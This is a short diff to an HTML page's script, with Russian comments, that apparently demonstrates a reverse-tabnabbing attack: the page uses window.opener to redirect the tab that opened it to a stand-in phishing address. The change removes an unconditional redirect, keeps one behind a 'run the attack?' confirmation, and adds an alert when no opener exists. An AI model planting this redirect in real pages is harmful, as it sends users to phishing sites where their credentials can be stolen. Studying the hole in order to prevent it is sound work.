@@ -3,14 +3,13 @@
 <script>
     setTimeout(() => {
         if (window.opener) {
-            // Меняем URL opener
-            window.opener.location.href = 'https://evil-phishing-site.example.com';
-            
             // Или показываем подтверждение
             const confirmed = confirm('Выполнить атаку?');
             if (confirmed) {
                 window.opener.location.href = 'https://evil-phishing-site.example.com';
             }
+        } else {
+            alert('opener is null');
         }
     }, 1000);
 </script>
